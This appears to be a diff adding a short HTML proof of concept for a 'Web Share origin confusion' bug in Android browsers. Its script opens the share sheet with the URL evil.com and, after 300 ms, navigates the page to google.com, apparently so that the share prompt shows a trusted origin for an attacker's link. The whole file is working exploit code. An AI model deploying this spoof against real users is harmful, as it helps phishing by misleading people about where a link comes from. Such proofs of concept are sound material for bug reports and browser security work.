@@ -1,0 +1,30 @@
+<!doctype html>
+<html>
+<body>
+<button id="shareBtn">Share</button>
+
+<script>
+document.getElementById('shareBtn').addEventListener('click', async () => {
+  if (!navigator.share) {
+    alert('Web Share API not supported');
+    return;
+  }
+
+  // Trigger cross-origin navigation shortly after share
+  setTimeout(() => {
+    location.href = 'https://www.google.com';
+  }, 300);
+
+  try {
+    await navigator.share({
+      title: 'Android PoC',
+      text: 'Web Share origin confusion PoC',
+      url: 'https://evil.com'
+    });
+  } catch (e) {
+    console.log(e);
+  }
+});
+</script>
+</body>
+</html>
